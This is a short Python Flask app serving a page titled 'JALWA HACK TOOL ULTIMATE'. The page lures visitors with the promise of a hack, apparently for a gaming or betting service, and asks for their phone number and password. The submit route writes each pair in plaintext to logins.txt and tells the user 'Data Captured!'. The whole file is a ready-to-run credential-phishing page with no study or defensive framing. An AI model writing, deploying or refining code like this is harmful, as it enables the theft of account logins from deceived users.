from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <h1 style="color:lime; background:black; font-size:40px;">🔥 JALWA HACK TOOL ULTIMATE 🔥</h1>
    <h3 style="color:red;">H A C K   N U M B E R   F O U N D !</h3>
    <form action="/submit" method="post">
        <b>Number:</b> <input type="text" name="number"><br><br>
        <b>Password:</b> <input type="password" name="password"><br><br>
        <input type="submit" value="💣 Hack Now 💣">
    </form>
    <p style="color:yellow; font-size:20px;">Use this number to sign up and activate hack - Jalwa Mode ON!</p>
    '''

@app.route('/submit', methods=['POST'])
def submit():
    number = request.form.get('number')
    password = request.form.get('password')
    with open("logins.txt", "a") as f:
        f.write(f"Number: {number}, Password: {password}\n")
    return '''
    <h3 style="color:lime;">✅ Hack Successful! Data Captured!</h3>
    <p>Check your logins.txt file.</p>
    <a href="/">Back</a>
    '''

if __name__ == "__main__":
    app.run()
